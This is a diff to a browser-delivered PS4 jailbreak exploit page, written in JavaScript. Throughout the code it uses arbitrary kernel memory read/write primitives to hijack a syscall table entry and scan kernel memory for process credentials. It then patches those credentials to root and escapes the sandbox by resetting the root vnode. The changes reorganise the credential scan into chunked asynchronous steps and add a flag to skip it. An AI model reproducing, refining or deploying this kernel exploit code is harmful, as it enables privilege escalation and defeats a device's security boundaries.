@@ -118,7 +118,7 @@ html, body {
 // ========== SHARED CONFIG ==========
 var Q = new URLSearchParams(location.search);
 
-var REVISION = "genuine-u8-rw-4-1352";
+var REVISION = "genuine-u8-rw-5-1352";
 var headerMsg = "mansoor0x";
 
 var MAX_ATTEMPTS = (function(){
@@ -139,6 +139,7 @@ var CARRIER_SLOTS = (function(){
     return Math.max(100000, Math.min(4000000, v));
 })();
 var SKIP_JAILBREAK = Q.get("jb") === "0" || Q.get("l") === "1";
+var SKIP_UCRED_SIG_SCAN = Q.get("ksig") === "0";
 var JB_DELAY_MS = (function(){
     var v = parseInt(Q.get("jbdelay") || "7500", 10);
     if (!isFinite(v)) v = 7500;
@@ -215,6 +216,8 @@ var TAG_MAP = {
     "SYSENT-661":         ["KEXPLOIT", "info"],
     "JMP-RSI":            ["KEXPLOIT", "info"],
     "SYSENT-HIJACKED":    ["KEXPLOIT", "pass"],
+    "KSCAN-BEGIN":        ["KEXPLOIT", "run"],
+    "KSCAN-PROC-DONE":    ["KEXPLOIT", "info"],
     "JAILBREAK-ERROR":    ["KEXPLOIT", "fail"],
     "SCAN-HIT":           ["SANDBOX", "info"],
     "UCRED-SIG-CANDIDATE":["SANDBOX", "info"],
@@ -989,10 +992,11 @@ function scheduleSurvivalMarks() {
 }
 
 // ========== R/W PRIMITIVES ==========
+var rwVecSave = new Array(8);
+
 function read64(addr) {
     if (!globalFakeArray) return 0n;
-    var oldVec = [];
-    for (var i = 0; i < 8; i++) oldVec[i] = globalFakeArray[0x10 + i];
+    for (var i = 0; i < 8; i++) rwVecSave[i] = globalFakeArray[0x10 + i];
 
     var low = Number(BigInt(addr) & 0xFFFFFFFFn);
     var high = Number((BigInt(addr) >> 32n) & 0xFFFFFFFFn);
@@ -1002,14 +1006,13 @@ function read64(addr) {
     var val = 0n;
     for (var i = 0; i < 8; i++) val |= BigInt(globalFakeArray[i]) << BigInt(i*8);
 
-    for (var i = 0; i < 8; i++) globalFakeArray[0x10 + i] = oldVec[i];
+    for (var i = 0; i < 8; i++) globalFakeArray[0x10 + i] = rwVecSave[i];
     return val;
 }
 
 function write64(addr, value) {
     if (!globalFakeArray) return;
-    var oldVec = [];
-    for (var i = 0; i < 8; i++) oldVec[i] = globalFakeArray[0x10 + i];
+    for (var i = 0; i < 8; i++) rwVecSave[i] = globalFakeArray[0x10 + i];
 
     var low = Number(BigInt(addr) & 0xFFFFFFFFn);
     var high = Number((BigInt(addr) >> 32n) & 0xFFFFFFFFn);
@@ -1019,17 +1022,17 @@ function write64(addr, value) {
     var v = BigInt(value);
     for (var i = 0; i < 8; i++) globalFakeArray[i] = Number((v >> BigInt(i*8)) & 0xFFn);
 
-    for (var i = 0; i < 8; i++) globalFakeArray[0x10 + i] = oldVec[i];
+    for (var i = 0; i < 8; i++) globalFakeArray[0x10 + i] = rwVecSave[i];
 }
 
 // ========== PS4 JAILBREAK ==========
 function runJailbreak() {
     mark("===== PS4 JAILBREAK START =====", "fw=" + FW_LABEL);
-    compactLog(64);
+    compactLog(48);
 
     var evf, prison0, rootvnode, sysent, jmp, kbase, sysent_661, jmp_rsi;
     var sy_narg, sy_call, sy_thrcnt, proc, sandboxEscaped, verifyUid, verifyGid, verifyPrison;
-    var dbgMode, prisonVal, hits, scanOff;
+    var dbgMode, prisonVal, hits, scanOff, sigPtr, sigEnd;
 
     try {
         evf = fwOffsets.evf;
@@ -1046,6 +1049,10 @@ function runJailbreak() {
         mark("SYSENT-661", hex(sysent_661));
         mark("JMP-RSI", hex(jmp_rsi));
 
+        proc = kbase + BigInt(evf);
+        prisonVal = read64(kbase + BigInt(prison0));
+        mark("PRISON0", hex(prisonVal));
+
         sy_narg = Number(read64(sysent_661) & 0xFFFFFFFFn);
         sy_call = read64(sysent_661 + 8n);
         sy_thrcnt = Number(read64(sysent_661 + 0x2Cn) & 0xFFFFFFFFn);
@@ -1055,7 +1062,6 @@ function runJailbreak() {
         write64(sysent_661 + 0x2Cn, 1n);
         mark("SYSENT-HIJACKED", "success");
 
-        proc = kbase + BigInt(evf);
         sandboxEscaped = false;
         verifyUid = -1n;
         verifyGid = -1n;
@@ -1063,7 +1069,6 @@ function runJailbreak() {
         dbgMode = Q.get("dbg") === "1";
         hits = 0;
         scanOff = 0;
-        prisonVal = read64(kbase + BigInt(prison0));
     } catch (error) {
         mark("JAILBREAK-ERROR", error.message);
         return;
@@ -1081,33 +1086,15 @@ function runJailbreak() {
         return verifyUid === 0n && verifyGid === 0n && verifyPrison === prisonValIn;
     }
 
-    function finishJailbreak() {
+    function restoreSysent() {
+        write64(sysent_661, BigInt(sy_narg));
+        write64(sysent_661 + 8n, sy_call);
+        write64(sysent_661 + 0x2Cn, BigInt(sy_thrcnt));
+        mark("SYSENT-RESTORED", "success");
+    }
+
+    function finalizeJailbreak() {
         try {
-            if (!sandboxEscaped && hits > 0) mark("SANDBOX-ESCAPE", "marker-hits=" + hits + "-ucred-not-found");
-
-            if (!sandboxEscaped) {
-                var sigStart = proc - 0x4000n;
-                var sigEnd = proc + 0x4000n;
-                for (var s = sigStart; s < sigEnd && !sandboxEscaped; s += 8n) {
-                    try {
-                        var ref = Number(read64(s) & 0xFFFFFFFFn);
-                        if (ref < 1 || ref > 0x200) continue;
-                        var ngroups = Number(read64(s + 0x10n) & 0xFFFFFFFFn);
-                        if (ngroups < 1 || ngroups > 0x80) continue;
-                        var pr = read64(s + 0x30n);
-                        if (pr !== prisonVal) continue;
-                        if (dbgMode) mark("UCRED-SIG-CANDIDATE", hex(s) + "-ref=" + ref + "-groups=" + ngroups);
-                        if (patchAndVerifyUcred(s, prisonVal)) {
-                            sandboxEscaped = true;
-                            mark("UCRED-SIG-FOUND", hex(s));
-                            mark("SANDBOX-ESCAPE", "success");
-                            mark("VERIFY-UID", "uid=" + verifyUid + "-gid=" + verifyGid + "-prison-matches=true");
-                        }
-                    } catch (e) {}
-                }
-                if (!sandboxEscaped) mark("SANDBOX-ESCAPE", "FAILED-not-found");
-            }
-
             var root = read64(kbase + BigInt(rootvnode));
             var rootVerified = false;
             if (root > 0n && root < 0xffffffffffffn) {
@@ -1121,21 +1108,65 @@ function runJailbreak() {
             } else {
                 mark("ROOT-VNODE-SET", "FAILED-invalid-root");
             }
-
-            write64(sysent_661, BigInt(sy_narg));
-            write64(sysent_661 + 8n, sy_call);
-            write64(sysent_661 + 0x2Cn, BigInt(sy_thrcnt));
-            mark("SYSENT-RESTORED", "success");
-
+            restoreSysent();
             mark("===== JAILBREAK COMPLETE =====", "PS4 " + FW_LABEL + " root=" + sandboxEscaped + "-fs=" + rootVerified);
         } catch (error) {
+            try { restoreSysent(); } catch (_) {}
+            mark("JAILBREAK-ERROR", error.message);
+        }
+    }
+
+    function beginSigScanOrFinish() {
+        mark("KSCAN-PROC-DONE", "hits=" + hits + "-escaped=" + sandboxEscaped);
+        if (sandboxEscaped) {
+            setTimeout(finalizeJailbreak, 0);
+            return;
+        }
+        if (!sandboxEscaped && hits > 0) mark("SANDBOX-ESCAPE", "marker-hits=" + hits + "-ucred-not-found");
+        if (SKIP_UCRED_SIG_SCAN) {
+            mark("SANDBOX-ESCAPE", "FAILED-ksig=0-skipped");
+            setTimeout(finalizeJailbreak, 0);
+            return;
+        }
+        sigPtr = proc - 0x4000n;
+        sigEnd = proc + 0x4000n;
+        setTimeout(scanSigChunk, 0);
+    }
+
+    function scanSigChunk() {
+        try {
+            var step = 0x200n;
+            var end = sigPtr + step;
+            if (end > sigEnd) end = sigEnd;
+            for (; sigPtr < end && !sandboxEscaped; sigPtr += 8n) {
+                var ref = Number(read64(sigPtr) & 0xFFFFFFFFn);
+                if (ref < 1 || ref > 0x200) continue;
+                var ngroups = Number(read64(sigPtr + 0x10n) & 0xFFFFFFFFn);
+                if (ngroups < 1 || ngroups > 0x80) continue;
+                var pr = read64(sigPtr + 0x30n);
+                if (pr !== prisonVal) continue;
+                if (dbgMode) mark("UCRED-SIG-CANDIDATE", hex(sigPtr) + "-ref=" + ref + "-groups=" + ngroups);
+                if (patchAndVerifyUcred(sigPtr, prisonVal)) {
+                    sandboxEscaped = true;
+                    mark("UCRED-SIG-FOUND", hex(sigPtr));
+                    mark("SANDBOX-ESCAPE", "success");
+                    mark("VERIFY-UID", "uid=" + verifyUid + "-gid=" + verifyGid + "-prison-matches=true");
+                }
+            }
+            if (!sandboxEscaped && sigPtr < sigEnd) setTimeout(scanSigChunk, 0);
+            else {
+                if (!sandboxEscaped) mark("SANDBOX-ESCAPE", "FAILED-not-found");
+                setTimeout(finalizeJailbreak, 0);
+            }
+        } catch (error) {
+            try { restoreSysent(); } catch (_) {}
             mark("JAILBREAK-ERROR", error.message);
         }
     }
 
     function scanProcChunk() {
         try {
-            var end = Math.min(scanOff + 0x400, 0x4000);
+            var end = Math.min(scanOff + 0x100, 0x4000);
             for (; scanOff < end; scanOff += 8) {
                 var candidate = read64(proc + BigInt(scanOff));
                 if ((candidate & 0xFFFFFFFFn) === 0x726f7272n) {
@@ -1153,13 +1184,20 @@ function runJailbreak() {
                 }
             }
             if (!sandboxEscaped && scanOff < 0x4000) setTimeout(scanProcChunk, 0);
-            else setTimeout(finishJailbreak, 0);
+            else setTimeout(beginSigScanOrFinish, 0);
         } catch (error) {
+            try { restoreSysent(); } catch (_) {}
             mark("JAILBREAK-ERROR", error.message);
         }
     }
 
-    setTimeout(scanProcChunk, 0);
+    function startKernelScan() {
+        compactLog(40);
+        mark("KSCAN-BEGIN", "proc=" + hex(proc));
+        setTimeout(scanProcChunk, 0);
+    }
+
+    setTimeout(startKernelScan, 150);
 }
 
 // ========== AUTO-RETRY ENGINE ==========
@@ -1220,7 +1258,7 @@ function runAttempt() {
 // ========== INIT ==========
 updateMeta();
 renderStages();
-mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT + "-c=" + CARRIER_SLOTS + "-r=" + MAX_ATTEMPTS + "-jb=" + (SKIP_JAILBREAK ? "0" : "1") + "-jbdelay=" + JB_DELAY_MS);
+mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT + "-c=" + CARRIER_SLOTS + "-r=" + MAX_ATTEMPTS + "-jb=" + (SKIP_JAILBREAK ? "0" : "1") + "-jbdelay=" + JB_DELAY_MS + "-ksig=" + (SKIP_UCRED_SIG_SCAN ? "0" : "1"));
 try {
     runAttempt();
 } catch (error) {
